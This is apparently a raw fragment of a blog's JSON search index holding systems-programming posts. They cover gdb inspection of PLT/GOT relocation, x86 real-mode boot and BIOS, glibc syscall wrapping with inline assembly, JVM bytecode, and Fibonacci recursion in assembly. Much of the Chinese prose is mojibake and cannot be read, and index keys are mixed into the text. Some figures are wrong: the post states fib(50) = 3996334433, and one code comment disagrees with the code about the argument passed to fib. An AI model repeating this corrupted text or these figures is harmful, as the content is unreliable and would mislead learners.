assembler dump. (gdb) x/xg 0x404008 0x404008 \u003cprintf@got.plt\u003e:\t0x0000000000401040 # é‡å®šä½å‰çš„åœ°å€ (gdb) info stack #0 0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2 #1 0x0000000000000001 in ?? () #2 0x00007fffffffe1a9 in ?? () #3 0x0000000000000000 in ?? () (gdb) break print_message Breakpoint 3 at 0x4011c8: file demo.c, line 32. (gdb) continue Continuing. [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Breakpoint 1.1, 0x0000000000401070 in _start () (gdb) continue Continuing. Initializing... Global Data: 42 Global BSS: 0 Local Static: 100 Breakpoint 3, print_message () at demo.c:32 32\tprintf(\"%s\\n\", message); // Uses PLT/GOT for printf (gdb) x/xg 0x404008 0x404008 \u003cprintf@got.plt\u003e:\t0x00007ffff7c600f0 # é‡å®šä½åçš„åœ°å€ (gdb) info stack #0 print_message () at demo.c:32 #1 0x0000000000401244 in main () at demo.c:43 (gdb) break counter Breakpoint 4 at 0x40115e: file demo.c, line 16. (gdb) continue Continuing. Hello from .rodata! Breakpoint 4, counter () at demo.c:16 16\tcount++; (gdb) info stack #0 counter () at demo.c:16 #1 0x0000000000401257 in main () at demo.c:46 (gdb) x/xg 0x404008 0x404008 \u003cprintf@got.plt\u003e:\t0x00007ffff7c600f0 dynamic linker æ€»ç»“ The dynamic linker (ld-linux-*.so) is a shared object that the kernel loads directly. It bootstraps the loading of all other shared libraries and manages symbol resolution. Without it, dynamically linked programs (like most C programs using glibc) would not work. ","dynamic-linker-ç®€ä»‹#\u003cstrong\u003edynamic linker\u003c/strong\u003e ç®€ä»‹":"","how-dynamic-linker-works#\u003cstrong\u003eHow Dynamic Linker Works?\u003c/strong\u003e":"","ld_#\u003cstrong\u003eLD_DEBUG=reloc ./demo åˆ†æ\u003c/strong\u003e":"","ld_debugfiles-demo-åˆ†æ#LD_DEBUG=files ./demo åˆ†æ":"","ld_debuglibs-demo-åˆ†æ#\u003ccode\u003eLD_DEBUG=libs ./demo åˆ†æ\u003c/code\u003e":"","printf-é‡å®šä½åˆ†æ#\u003ccode\u003eprintf\u003c/code\u003e é‡å®šä½åˆ†æ":"","reference#Reference":" dynamic-linker å½»åº•ç†è§£è¿æ¥å™¨ç³»åˆ— ","what-is-the-dynamic-linker#\u003cstrong\u003eWhat Is the Dynamic Linker?\u003c/strong\u003e":""},"title":"Asm Dynamic Linker"},"/blog/asm-how-computer-startup/":{"data":{"":"x86 æ¶æ„è®¡ç®—æœºæ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼Ÿ","16-bit-processors-and-segmentation-1978#16-bit Processors and Segmentation (1978)":" The IA-32 architecture family was preceded by 16-bit processors, the 8086 and 8088. The 8086 has 16-bit registers and a 16-bit external data bus, with 20-bit addressing giving a 1-MByte address space. The 8088 is similar to the 8086 except it has an 8-bit external data bus. The 8086/8088 introduced segmentation to the IA-32 architecture. With segmentation, a 16-bit segment register contains a pointer to a memory segment of up to 64 KBytes. Using four segment registers at a time, 8086/8088 processors are able to address up to 256 KBytes without switching between segments. The 20-bit addresses that can be formed using a segment register and an additional 16-bit pointer provide a total address range of 1 MByte.\n8086 æ˜¯æ•´ä¸ª intel ç³»åˆ—å¤„ç†å™¨çš„è€ç¥–å®—ã€‚æ‰€æœ‰åç»­çš„ä¸€ç³»åˆ—å¤„ç†å™¨éƒ½å…¼å®¹ 8086ã€‚å”‰ï¼Œè¿™å°±æ˜¯è·¯å¾„ä¾èµ–å•Šã€‚è¿™æ˜¯ä¸€ä¸ª 16-bit çš„å¤„ç†å™¨ã€‚å¯„å­˜å™¨ä¹Ÿæ˜¯ 16-bit çš„ã€‚but å´èƒ½å¯»å€ 20-bit çš„åœ°å€ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯ 1M çš„å†…å­˜ã€‚æ€æ ·åœ¨ 16-bit çš„å¤„ç†å™¨ä¸Šå®ç°å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œå°† 1M çš„ç©ºé—´åˆ†æˆå¤šä¸ª 64K çš„ segmentã€‚é‚£æ€æ ·ç”¨ 16-bit çš„å¯„å­˜å™¨è¡¨ç¤º 20-bit çš„åœ°å€å‘¢ï¼Ÿä¹Ÿå¾ˆç®€å•ï¼Œç”¨ 2 ä¸ª 16-bit çš„å¯„å­˜å™¨ç»„åˆå¾—æ¥çš„(register1,register2)ã€‚é‚£æ€æ ·ç»„åˆçš„å‘¢ï¼Ÿaddress = register1 \u003c\u003c 4 + register2ã€‚å°† register1 Â« 4 å’Œ register2 ç”¨ä¸€ä¸ª 20-bit çš„åŠ æ³•å™¨å°±èƒ½å¾—åˆ°å†…å­˜åœ°å€ã€‚è¿™ç§æ–¹å¼å°±æ˜¯æ‰€è°“çš„ real address modeã€‚ä¹Ÿå³æ˜¯æ‹¿åˆ°çš„æ˜¯çœŸæ­£çš„å†…å­˜åœ°å€ã€‚x86 æ¶æ„çš„è®¡ç®—æœºå¯åŠ¨æ—¶ä¼šå…ˆè¿›å…¥ real address modeã€‚","bios#BIOS":"BIOS æ˜¯å•¥ BIOS æ˜¯å•¥å‘¢ï¼Ÿä¸€ä¸ªè½¯ä»¶è€Œå·²ã€‚ä¸åƒæˆ‘ä»¬å¹³æ—¶åœ¨ PC ä¸Šä½¿ç”¨å¦‚ QQ ç­‰è½¯ä»¶æ˜¯å®‰è£…åœ¨ç¡¬ç›˜ä¸Šçš„ã€‚BIOS å®‰è£…åœ¨ ROM ä¸­ã€‚è¿™ä¸ªè½¯ä»¶å¹²å•¥çš„å‘¢ï¼Ÿå¸®åŠ©è®¡ç®—æœºå¯åŠ¨ï¼Œå¼€æœºæ—¶æ£€æµ‹æ•´ä¸ªæœºå™¨çš„ç¡¬ä»¶ã€‚è®¡ç®—æœºå¯åŠ¨éœ€è¦è¿è¡Œè½¯ä»¶ï¼Œè½¯ä»¶è¿è¡Œéœ€è¦è®¡ç®—æœºå…ˆå¯åŠ¨ã€‚å’³å’³ï¼Œæˆäº†å…ˆæœ‰é¸¡è¿˜æ˜¯å…ˆæœ‰è›‹äº†ï¼Œè¿™æ€ä¹ˆè¡Œï¼Ÿæ‰€ä»¥éœ€è¦ BIOS è¿™ä¸ªåœ¨ç¡¬ä»¶ä¸Šçš„è½¯ä»¶æ¥å¸®åŠ©ï¼Œç ´é™¤è¿™ç§ä¾èµ–ã€‚\nBIOS å¤§å° é€šè¿‡ dmidecode è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹ã€‚ä¹Ÿå°±æ˜¯è¯»å– BIOS çš„ä¿¡æ¯ã€‚\nroot@aliyun:~# dmidecode -t bios -q # æ–¹æ³•ä¸€ BIOS Information Vendor: SeaBIOS Version: 8c24b4c Release Date: 04/01/2014 Address: 0xE8000 Runtime Size: 96 kB ROM Size: 64 kB --- ROM Sizeï¼Œåœ¨æ­¤å¯ä»¥çœ‹åˆ°ï¼ŒBIOS å¤§å°ä¸º 64Kã€‚ Characteristics: BIOS characteristics not supported Targeted content distribution is supported BIOS Revision: 0.0 root@aliyun:~# cd /sys/class/dmi/id/ # æ–¹æ³•äºŒ root@aliyun:id# ls bios_date chassis_serial modalias product_serial sys_vendor bios_vendor chassis_type power product_uuid uevent bios_version chassis_vendor product_family product_version chassis_asset_tag chassis_version product_name subsystem ","references#References":"1.x86-ORG 2. how-to-see-rom-size 3. bios-info-dmidecode 4. system-management-bios 5. è®¡ç®—æœºæ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼Ÿ 6. å¤šç§ MBR ç»„ç»‡æ–¹å¼ 7. è®¡ç®—æœºæ˜¯æ€æ ·å¯åŠ¨çš„ï¼Ÿ","x86-æ¶æ„è®¡ç®—æœºå¯åŠ¨æµç¨‹#x86 æ¶æ„è®¡ç®—æœºå¯åŠ¨æµç¨‹":" #(real address mode 1M å†…å­˜å¸ƒå±€)\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå½“æŒ‰ä¸‹ power on ä¹‹åï¼Œæ­¤æ—¶çš„ CPU å¤„äº real address modeã€‚ç”±ç¡¬ä»¶è´Ÿè´£å°† BIOS 64K çš„å†…å®¹åŠ è½½åˆ° 0xF0000 åˆ° 0xFFFFF(64K å†…å­˜)ã€‚å¹¶å°† CS(code segment) ç½®ä¸º 0xF000ï¼ŒIP(instruction pointer) ç½®ä¸º 0xFFF0ã€‚ç»„åˆèµ·æ¥çš„å†…å­˜åœ°å€ PC å°±æ˜¯ 0xFFFF0ã€‚\næ­¤æ—¶ CPU ä» PC = 0xFFFF0 å¤„å¼€å§‹å–æŒ‡ã€æ‰§è¡Œã€‚é‚£ä¹ˆä» 0xFFFF0 åˆ° 0xFFFFF åªæœ‰ 16Bytesã€‚ç©ºé—´å¤ªå°äº†ï¼Œèƒ½æ”¾å•¥å‘¢ï¼Ÿä½†æ˜¯å¯ä»¥è·³åˆ°å…¶ä»–åœ°æ–¹å»æ‰§è¡Œå•Šã€‚ä¸é”™ï¼Œè¿™é‡Œå­˜æ”¾çš„æœ‰ä¸€æ¡æŒ‡ä»¤æ˜¯ jmp far f000:e05b, ç»„åˆèµ·æ¥å°±æ˜¯ 0xfe05bã€‚æ³¨æ„è¿™ä¸ªåœ°å€å¯æ˜¯åœ¨ 0xF0000 åˆ° 0xFFFFF èŒƒå›´ä¹‹å†…ï¼Œä¹Ÿå°±æ˜¯è¿™æ¡æŒ‡ä»¤è·³è½¬åˆ° BIOS å†…éƒ¨çš„ä»£ç å»æ‰§è¡Œã€‚ä» 0xFE05B åˆ° 0xFFFF0 å°†è¿‘ 8K å†…å­˜ï¼Œä»£ç ä¸å°‘ã€‚\næ­¤æ—¶ CPU ä» PC = 0xfe05b å¼€å§‹å–å€¼ã€æ‰§è¡Œã€‚å…·ä½“å¹²å•¥å‘¢ï¼Ÿå°±æ˜¯æ‰§è¡Œæ‰€è°“çš„å¼€æœºè‡ªæ£€ã€‚æ£€æŸ¥è®¡ç®—æœºç¡¬ä»¶ã€‚åŒæ—¶å»æ‰¾å¯åŠ¨æ‰‡åŒºï¼Œé‚£ä»€ä¹ˆæ‰æ˜¯å¯åŠ¨æ‰‡åŒºå‘¢ï¼Ÿè‹¥ 0 ç›˜ 0 é“ 1 æ‰‡åŒºæœ€åä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«æ˜¯ 0x55,0xaaï¼Œé‚£å°±æ˜¯å¯åŠ¨åŒºã€‚å¾ˆåƒ java class æ–‡ä»¶ä¸­çš„é­”æ•°ï¼Œå°±æ˜¯æ ‡è®°ä¸€ä¸‹ã€‚åŒæ—¶å°†æ‰¾åˆ°çš„å¯åŠ¨æ‰‡åŒº(512Bytes) å¤åˆ¶åˆ°å†…å­˜ 0x7C00 åˆ° 0x7DFF(512Bytes) å¤„ã€‚æœ€åä¼šå°† CS ç½®ä¸º 0x0000ï¼Œ IP ç½®ä¸º 0x7C00ï¼Œç»„åˆèµ·æ¥å°±æ˜¯ 0x7C00ã€‚\næ­¤æ—¶ CPU ä» PC = 0x7C00 å¼€å§‹å–å€¼ã€æ‰§è¡Œã€‚å…·ä½“å¹²å•¥å‘¢ï¼Ÿè¿™å°±æ˜¯å¼€å‘äººå‘˜å¯ä»¥å†³å®šçš„äº†ã€‚åœ¨å¯åŠ¨æ‰‡åŒºä¸Šå¯ä»¥æ˜¯åŠ è½½ OS Kernel çš„ä»£ç ï¼Œç¡¬ç›˜åˆ†åŒºï¼Œboot loader ç­‰ã€‚","è®¡ç®—æœºå¯åŠ¨å‰ç½®çŸ¥è¯†#è®¡ç®—æœºå¯åŠ¨å‰ç½®çŸ¥è¯†":" CPU å·¥ä½œæ–¹å¼æ˜¯: ä»å†…å­˜ä¸­å–æŒ‡ã€æ‰§è¡Œã€‚ å†…å­˜æ˜¯å­˜å‚¨æ•°æ®çš„åœ°æ–¹ï¼Œç»™å‡ºä¸€ä¸ªå†…å­˜åœ°å€ï¼Œå¯ä»¥å¾—åˆ°è¯¥å¤„çš„æ•°æ®ã€‚ CPU ä»å†…å­˜å“ªé‡Œå–æŒ‡ä»¤ï¼Œç”± instruction pointer è¿™ä¸ªå¯„å­˜å™¨çš„å€¼å†³å®šã€‚è¿™ä¸ªå€¼ä¸æ–­ +1ï¼Œæˆ–è€…è·³è½¬(jump) åˆ°æŸå¤„ã€‚real address mode ä¸‹ç”± CS:IP ç»„åˆå†³å®šã€‚ "},"title":"asm-how-computer-startup"},"/blog/asm-how-glibc-wrap-syscall/":{"data":{"argument-setup#Argument Setupâ€‹â€‹":"","how-glibc-wraps-system-calls#How glibc Wraps System Callsâ€‹â€‹":"","kernel-transition#â€‹Kernel Transitionâ€‹â€‹":" å®éªŒå¹³å°: x86_64 GNU/Linux mint22.1\nä½¿ç”¨ glibc çš„å‡½æ•°write1.c\n#include \u003cunistd.h\u003e int main() { const char msg[] = \"Hello, glibc!\\n\"; write(1, msg, sizeof(msg) - 1); // glibc's write() wrapper return 0; } gcc -o write1 write1.c ä½¿ç”¨ ltrace ./write1 æŸ¥çœ‹è°ƒç”¨äº† write åº“å‡½æ•° ä¸ä½¿ç”¨ glibc çš„å‡½æ•°write2.c\n#include \u003cerrno.h\u003e #include \u003csyscall.h\u003e #include \u003cunistd.h\u003e ssize_t write_no_glibc(int fd, const void *buf, size_t count) { long ret; asm volatile( \"syscall\" : \"=a\"(ret) // Output: result in rax : \"a\"(__NR_write), \"D\"(fd), \"S\"(buf), \"d\"(count) // Inputs : \"rcx\", \"r11\", \"memory\" // Clobbered registers ); if (ret \u003c 0) { errno = -ret; // Set errno on error return -1; } return ret; // Return bytes written } int main() { const char msg[] = \"Hello, glibc!\\n\"; write_no_glibc(1, msg, sizeof(msg) - 1); return 0; } gcc -o write2 write2.c ä½¿ç”¨ ltrace ./write2 æŸ¥çœ‹æ²¡æœ‰è°ƒç”¨ write åº“å‡½æ•° How glibc Wraps System Callsâ€‹â€‹â€‹System Call Numberâ€‹â€‹ Each system call (e.g., write, read) is assigned a unique number (e.g., __NR_write). è¦ä½¿ç”¨å“ªä¸€ä¸ª syscall\nArgument Setupâ€‹â€‹ The wrapper loads the system call number and arguments into specific registers (architecture-dependent). è®¾ç½® syscall çš„å‚æ•°\nâ€‹Kernel Transitionâ€‹â€‹ The wrapper uses an instruction like syscall (x86-64) to switch to kernel mode. è¿›å…¥ kernel mode","references#References":" https://man7.org/linux/man-pages/man1/ltrace.1.html ","result-handling#Result Handlingâ€‹â€‹":"After the kernel finishes, the wrapper checks for errors, sets errno if needed, and returns the result. å¤„ç†è¿”å›å€¼","system-call-number#â€‹System Call Numberâ€‹â€‹":"","ä¸ä½¿ç”¨-glibc-çš„å‡½æ•°#ä¸ä½¿ç”¨ glibc çš„å‡½æ•°":"","ä½¿ç”¨-glibc-çš„å‡½æ•°#ä½¿ç”¨ \u003ccode\u003eglibc\u003c/code\u003e çš„å‡½æ•°":""},"title":"Asm How Glibc Wrap Syscall"},"/blog/asm-how-java-byte-code-execute/":{"data":{"jclasslib-æŸ¥çœ‹å­—èŠ‚ç #jclasslib æŸ¥çœ‹å­—èŠ‚ç ":"","jvm#jvm":"jvm jvm æ˜¯ä¸€ä¸ªæ ˆå¼(stack-based)è™šæ‹Ÿè®¡ç®—æœºã€‚å•¥æ„æ€ï¼Œå°±æ˜¯å¤§å¤šæ•°çš„ opcode çš„æ“ä½œæ•°åœ¨ operand stack ä¸Šï¼Œæ‰§è¡Œçš„ç»“æœä¹Ÿæ”¾åœ¨ oprand stack ä¸Šã€‚\næœ‰çš„ opcode çš„æ“ä½œæ•°åœ¨ local variable tableï¼Œå¦‚ iincã€‚","references#References":" postfix-expression jclasslib jvms-6.5.iconst_i jvms-6.5.invokestatic jvms-6.5.getstatic ","åˆ†æçš„ä»£ç #åˆ†æçš„ä»£ç ":" package stardustman.github.io; public class BoxingUnboxingExample { public static void main(String[] args) { Integer sum = 0; for (int i = 1; i \u003c= 1000000; i++) { sum += i; // Auto-boxing of primitive type int to Integer } System.out.println(\"The sum is: \" + sum); } } ","å­—èŠ‚ç æ‰§è¡Œè¿‡ç¨‹#å­—èŠ‚ç æ‰§è¡Œè¿‡ç¨‹":""},"title":"Asm How Java Byte Code Execute"},"/blog/asm-how-recursion-function-execute/":{"data":{"asm-ä»£ç #Asm ä»£ç ":"ä¸­é—´ä»£ç  fib(long): pushq %rbp movq %rsp, %rbp pushq %rbx subq $24, %rsp movq %rdi, -24(%rbp) // n cmpq $2, -24(%rbp) // n - 2 jg .L2 movl $1, %eax // n \u003c= 2 jmp .L3 .L2: movq -24(%rbp), %rax // n subq $1, %rax // n - 1 movq %rax, %rdi call fib(long) movq %rax, %rbx // movq -24(%rbp), %rax // n subq $2, %rax // n - 2 movq %rax, %rdi call fib(long) addq %rbx, %rax .L3: addq $24, %rsp // é‡Šæ”¾åˆ†é…çš„æ ˆç©ºé—´ popq %rbx popq %rbp ret main: pushq %rbp movq %rsp, %rbp subq $16, %rsp movl $3, %edi // n = 3 call fib(long) movq %rax, -8(%rbp) // result = fib(3) movl $0, %eax leave ret åç¼–è¯‘å¯æ‰§è¡Œä»£ç  fib(long): push %rbp mov %rsp,%rbp push %rbx sub $0x18,%rsp mov %rdi,-0x18(%rbp) cmpq $0x2,-0x18(%rbp) jg 4004cd \u003cfib(long)+0x1b\u003e // 0x1b æ˜¯åœ°å€ä¸º 4004cd è¿™æ¡æŒ‡ä»¤ä¹‹å‰çš„æ‰€æœ‰æŒ‡ä»¤çš„å­—èŠ‚æ•° mov $0x1,%eax jmp 4004f3 \u003cfib(long)+0x41\u003e // 0x41 æ˜¯åœ°å€ä¸º 4004f3 è¿™æ¡æŒ‡ä»¤ä¹‹å‰çš„æ‰€æœ‰æŒ‡ä»¤çš„å­—èŠ‚æ•° mov -0x18(%rbp),%rax sub $0x1,%rax mov %rax,%rdi callq 4004b2 \u003cfib(long)\u003e mov %rax,%rbx mov -0x18(%rbp),%rax sub $0x2,%rax mov %rax,%rdi callq 4004b2 \u003cfib(long)\u003e add %rbx,%rax add $0x18,%rsp pop %rbx pop %rbp retq main: push %rbp mov %rsp,%rbp sub $0x10,%rsp movq $0x0,-0x8(%rbp) mov $0x4,%edi callq 4004b2 \u003cfib(long)\u003e mov %rax,-0x8(%rbp) mov $0x0,%eax leaveq retq nop fib(n)å‡½æ•°é‡Œè°ƒç”¨ fib(n - 1) å’Œ fib(n - 2)è§†ä¸ºä¸¤ä¸ªå’Œ fib(n) å®Œå…¨ä¸åŒçš„å‡½æ•°, å› ä¸ºå‡½æ•°è¿”å›åœ°å€åœ¨æ±‡ç¼–å±‚é¢æ ¹æœ¬ä¸ä¸€æ ·. fib(n), fib(n - 1) å’Œ fib(n - 2) çš„å¤„ç†é€»è¾‘ä¸ä¸€æ ·, åªæ˜¯ä¹‹é—´æœ‰ä¾èµ–è€Œå·². ä¹Ÿå¯ä»¥è§†ä¸ºç¼–è¯‘å™¨çº§åˆ«çš„å‡½æ•°é‡è½½. ç†è§£æˆä¸‰ä¸ªä¸åŒçš„å‡½æ•°, è¿™ä¸ªé€’å½’å°±å¾ˆå¥½ç†è§£äº†. ","c-ä»£ç #C ä»£ç ":" #include \u003cstdio.h\u003e long fib(long n){ if(n \u003c= 2){ return 1; } return fib(n-1) + fib(n-2); } int main(){ long result = 0; result = fib(4); //printf(\"%d\\n\",result); return 0; } ","references#References":" asm-cmpq asm-jg asm-jp-table æ–æ³¢é‚£å¥‘æ•°åˆ— asm-tool å°¾è°ƒç”¨(tail-call)ä¹‹å°¾é€’å½’ åŠ¨æ€è§„åˆ’ ","ä»£ç åˆ†æ#ä»£ç åˆ†æ":"","ä¼˜åŒ–é€’å½’#ä¼˜åŒ–é€’å½’":"ç©ºé—´æ¢æ—¶é—´ä¼˜åŒ–ä»£ç  #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e # define LENGTH 51 // è®¡ç®— fib(50) // å…¨å±€çš„ç”¨æ¥ä¿å­˜ fib(n)(n \u003e 2) è®¡ç®—ç»“æœçš„æ•°ç»„. unsigned long result[LENGTH]; unsigned long fib(long n){ // fib(n) å·²ç»è¢«è®¡ç®—, é‚£å°±ç›´æ¥è¿”å›. if(result[n] != 0){ return result[n]; } else{ // ä¿å­˜ fib(n) çš„è®¡ç®—ç»“æœ result[n] = fib(n-1) + fib(n-2); } return result[n]; } int main(){ clock_t beginTime,endTime; // ç”±äº 1, 1, 2, 3, 5 ..... éƒ½æ˜¯å¤§äº 0 çš„ç»“æœ, å…¨éƒ¨åˆå§‹åŒ–ä¸º 0, ç›¸å½“äºéƒ½æ²¡æœ‰è®¡ç®—ç»“æœ. for(int i = 0; i \u003c LENGTH ; i++){ result[i] = 0; } // fib(1) çš„è®¡ç®—ç»“æœä¸º 1 result[1] = 1; // fib(2) çš„è®¡ç®—ç»“æœä¸º 1 result[2] = 1; beginTime = clock(); fib(LENGTH - 1); endTime = clock(); printf(\"Running Time %f Seconds\\n\",(double)(endTime - beginTime)/CLOCKS_PER_SEC); for(int i = 1; i \u003c LENGTH; i++){ printf(\" %i :: %lu \\n\", i, result[i]); } } ä¼˜åŒ–é€’å½’å‡½æ•°æ ˆå¸§ fib(5)é€’å½’æ ˆå¸§)\nç€è‰²æ–¹æ¡†-å¼€è¾Ÿé”€æ¯çš„æ ˆå¸§ ç™½è‰²æ–¹æ¡†-ä¸ç”¨å¼€è¾Ÿçš„æ ˆå¸§ ä¼˜åŒ–åçš„ fib(n) å¼€è¾Ÿæ ˆå¸§æ€»æ•°é‡å¯ä»¥è¡¨ç¤ºä¸º: sum(n) = (n - 2)(n \u003e= 3). æ—¶é—´å¤æ‚åº¦æ˜¯: O(n) è®¡ç®— fib(50) å¼€è¾Ÿæ ˆå¸§æ€»æ•°é‡æ˜¯: sum(50) = 48 fib(50) = 3996334433 æ—¶é—´å¤æ‚åº¦æ˜¯ O(50), ç»“æœå‡ ä¹ç§’ç®—. unsigned long result[LENGTH]; æ‹¿ç©ºé—´æ¢æ—¶é—´, å…¶å®è¿™å¥è¯æœ‰é—®é¢˜çš„, æ‹¿å‡ºæ¥ç©ºé—´, è®¡ç®—é€»è¾‘ä¹Ÿæ˜¯è¦ä¼˜åŒ–çš„. å°¾é€’å½’ä¼˜åŒ– éä¼˜åŒ–é€’å½’ unsigned long fib(unsigned long n){ if(n \u003c= 2){ return 1; } return fib(n-1) + fib(n-2); } æ±‡ç¼–è§†è§’ä¸‹è¿™é‡Œ fib(n-1) å’Œ fib(n-2) ä¸ fib(n) å…¶å®æ ¹æœ¬ä¸æ˜¯åŒä¸€ä¸ªå‡½æ•°. ä¸‰è€…çš„é€»è¾‘å…¶å®ä¸åŒ, ä½†æ˜¯å‡½æ•°ä¹‹é—´æœ‰ä¾èµ–. ä¼˜åŒ–é€’å½’ å°¾é€’å½’çš„å®ç°, å¾€å¾€éœ€è¦æ”¹å†™é€’å½’å‡½æ•°, ç¡®ä¿æœ€åä¸€æ­¥åªè°ƒç”¨è‡ªèº«. åšåˆ°è¿™ä¸€ç‚¹çš„æ–¹æ³•, å°±æ˜¯æŠŠæ‰€æœ‰ç”¨åˆ°çš„å†…éƒ¨å˜é‡æ”¹å†™æˆå‡½æ•°çš„å‚æ•°. å°¾è°ƒç”¨çš„æ¦‚å¿µéå¸¸ç®€å•, ä¸€å¥è¯å°±èƒ½è¯´æ¸…æ¥š, å°±æ˜¯æŒ‡æŸä¸ªå‡½æ•°çš„æœ€åä¸€æ­¥æ˜¯è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°. ä¸­é—´å˜é‡æ”¹æˆå‡½æ•°çš„å‚æ•° unsigned long fib(unsigned long n, unsigned long prev, unsigned long sum ){ if(n \u003c= 3){ return sum; } return fib(n-1, sum , prev + sum); // å°¾è°ƒç”¨ } è¿™é‡Œ fib(n-1, sum , prev + sum) çš„æ‰æ˜¯å’Œ fib(unsigned long n, unsigned long prev, unsigned long sum ) å®Œå…¨ä¸€æ ·çš„å‡½æ•°.\nåŒ…è£…ä¸€å±‚ unsigned long fibonacc(unsigned long n){ if( n \u003c= 2){ return 1; } // 1 : fib(2) // 2 : fib(2) + fib(1) = fib(3) return fib(n, 1, 2); } è®¡ç®—ç»“æœä¿å­˜åœ¨å‚æ•°é‡Œ.\nfib(n) æ±‡ç¼–ä»£ç åˆ†æ #(å°¾é€’å½’æ±‡ç¼–ä»£ç )\nå°¾é€’å½’çš„ fib(n-1, sum , prev + sum) æ˜¯å°¾è°ƒç”¨, ä¹Ÿå°±æ˜¯å‡½æ•°æ‰§è¡Œå®Œæ²¡æœ‰å…¶ä»–çš„æ“ä½œäº†, å°±ç›´æ¥è¿”å›äº†. ç¬¦åˆ n \u003c= 3 çš„æ¡ä»¶, æ±‡ç¼–ç›´æ¥ jmp åˆ°é”€æ¯æ ˆå¸§çš„ä»£ç . å› ä¸ºè¿”å›å€¼åœ¨ç¬¦åˆé€’å½’é€€å‡ºæ¡ä»¶æ—¶, å·²ç»è¢«è®¾ç½®åˆ° rax é‡Œäº†. ","å›¾è§£#å›¾è§£":" å‡è®¾åœ¨næœˆæœ‰å…”å­æ€»å…± a å¯¹, n+1 æœˆæ€»å…±æœ‰ b å¯¹. åœ¨ n+2 æœˆå¿…å®šæ€»å…±æœ‰ a+b å¯¹: å› ä¸ºåœ¨ n+2 æœˆçš„æ—¶å€™, å‰ä¸€æœˆ(n+1æœˆ) çš„ b å¯¹å…”å­å¯ä»¥å­˜ç•™è‡³ç¬¬ n+2 æœˆ(åœ¨å½“æœˆå±äºæ–°è¯ç”Ÿçš„å…”å­å°šä¸èƒ½ç”Ÿè‚²). è€Œæ–°ç”Ÿè‚²å‡ºçš„å…”å­å¯¹æ•°ç­‰äºæ‰€æœ‰åœ¨ n æœˆå°±å·²å­˜åœ¨çš„ a å¯¹.","æ–æ³¢é‚£å¥‘æ•°åˆ—#æ–æ³¢é‚£å¥‘æ•°åˆ—":"æ–æ³¢é‚£å¥‘æ•°åˆ—","ç»“è®º#ç»“è®º":" ç”¨ç®€å•çš„ä¸€å¥è¯,é€’å½’å°±æ˜¯è°ƒç”¨å‡½æ•°æœ¬èº«. è¿™å¥è¯æ˜¯ç›¸å½“ä¸è´Ÿè´£ä»»çš„. é€’å½’å‡½æ•°åœ¨æ±‡ç¼–çº§åˆ«çš„è°ƒç”¨è‡ªå·±, å°½ç®¡è°ƒç”¨çš„æ˜¯è‡ªå·±, é€’å½’çš„å‡½æ•°åå°½ç®¡ç›¸åŒ, ä½†æ˜¯å‡½æ•°è¿”å›åœ°å€æ˜¯ä¸ç›¸åŒçš„. è¿™ä¹Ÿæ„å‘³ç€å…¶å®é€»è¾‘å®Œå…¨å¯èƒ½ä¸ä¸€æ ·. ç»“åˆæ ˆå¸§çš„åˆ›å»ºå’Œé”€æ¯, å°±å¯ä»¥ç†è§£ Stack Overflow è¿™ç§é”™è¯¯. ","è°ƒç”¨æ ˆè°ƒç”¨é¡ºåºåˆ†æ#è°ƒç”¨æ ˆè°ƒç”¨é¡ºåºåˆ†æ":"è°ƒç”¨æ ˆå›¾è§£åˆ†æ #(fib(4)è°ƒç”¨æ ˆåˆ†æ)\nç¬¦åˆé€’å½’ç»ˆæ­¢æ—¶è°ƒç”¨æ ˆæ‰§è¡Œé¡ºåº fib(3) = fib(2) + fib(1), å°±ç¬¦åˆé€’å½’é€€å‡ºçš„æ¡ä»¶.\nä»£ç æ‰§è¡Œé¡ºåº #(fib(3)-execute-sequence)\näºŒå‰æ ‘ååºéå†çš„è§†è§’æ¥åˆ†æ é€’å½’ç»ˆæ­¢æ¡ä»¶: fib(2) = 1 è§†ä¸ºå·¦å¶å­èŠ‚ç‚¹ fib(1) = 1 è§†ä¸ºå³å¶å­èŠ‚ç‚¹ fib(3) = fib(2) + fib(1) è§†ä¸ºçˆ¶èŠ‚ç‚¹ #(ç¬¦åˆé€’å½’é€€å‡ºä»£ç æ‰§è¡Œæµç¨‹)\nfib(3) è°ƒç”¨ fib(2), è®¡ç®—å‡ºå‚æ•° n = 2. è¿›å…¥å·¦å¶å­èŠ‚ç‚¹. fib(2) è¿”å› fib(3), fib(2) çš„è¿”å›å€¼ rax = 1, å¤åˆ¶ç»™ rbx. fib(3) è°ƒç”¨ fib(1), è®¡ç®—å‡ºå‚æ•° n = 1. è¿›å…¥å³å¶å­èŠ‚ç‚¹. fib(1) è¿”å› fib(3), fib(1) çš„è¿”å›å€¼ rax = 1 fib(3) è®¡ç®— fib(3) = fib(2) + fib(1) = rbx + rax = 1 + 1 = 2 æ ˆå¸§çš„åˆ›å»ºå’Œé”€æ¯-äºŒå‰æ ‘ååºéå† fib(n) = fib(n-1) + fib(n-2)(n \u003e 2) é€’å½’è°ƒç”¨å¯ä»¥çœ‹ä½œæ˜¯æ ˆå¸§æŒ‰ç…§äºŒå‰æ ‘åç»­éå†(å·¦å­æ ‘-å³å­æ ‘-æ ¹)çš„é¡ºåºåŠ¨æ€çš„åˆ›å»ºå’Œé”€æ¯. ç€è‰²æ–¹æ¡†ä¸ºåˆ›å»ºçš„æ ˆå¸§ ç™½è‰²æ–¹æ¡†ä¸ºé”€æ¯çš„æ ˆå¸§æˆ–è€…è¿˜æœªåˆ›å»ºçš„æ ˆå¸§ æ–¹æ¡†ç”±ç™½è‰²å˜ä¸ºç€è‰²: æ ˆå¸§åˆ›å»º æ–¹æ¡†ç”±ç€è‰²å˜ä¸ºç™½è‰²: æ ˆå¸§é”€æ¯ ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºå‡å¦‚ main è°ƒç”¨ fib(5), ä¼šä¸€ç›´è°ƒç”¨åˆ° f(2) æ‰ä¼šç»ˆæ­¢. åˆ™è°ƒç”¨æ 